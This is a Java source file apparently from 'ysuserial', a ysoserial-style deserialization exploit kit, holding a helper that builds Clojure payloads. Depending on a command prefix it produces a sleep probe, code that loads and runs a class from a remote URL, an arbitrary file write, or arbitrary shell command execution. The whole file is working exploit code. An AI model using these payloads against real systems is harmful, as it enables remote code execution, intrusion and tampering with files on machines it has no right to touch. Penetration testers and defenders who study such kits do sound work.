package org.su18.ysuserial.payloads.util;

import org.su18.ysuserial.Strings;

import java.util.Arrays;

import static org.su18.ysuserial.payloads.util.Utils.handlerCommand;


/**
 * @author su18
 */
public class ClojureUtil {

	public static String makeClojurePayload(String command) {
		if (command.startsWith("TS-"))
			return String.format("(java.lang.Thread/sleep " + (Integer.parseInt(command.split("[-]")[1]) * 1000) + ")", new Object[0]);
		if (command.startsWith("RC-")) {
			String[] strings = handlerCommand(command);
			return "(def urlStr (new String \"" + strings[0] + "\"))\n(def url (new java.net.URL urlStr))\n(def loader (new java.net.URLClassLoader (into-array [url])))\n(def clazz (.loadClass loader \"" + strings[1] + "\"))\n(.newInstance clazz)";
		}
		if (command.startsWith("WF-")) {
			String[] strings = handlerCommand(command);
			return "(def path (new String \"" + strings[0] + "\"))\n(def out (new java.io.FileOutputStream path))\n(def byts (.getBytes \"" + strings[1] + "\"))\n(.write out byts)";
		}
		String cmd = Strings.join(Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\").split(" ")), " ", "\"", "\"");
		return String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)(println \"su18\")", new Object[]{cmd});
	}

}
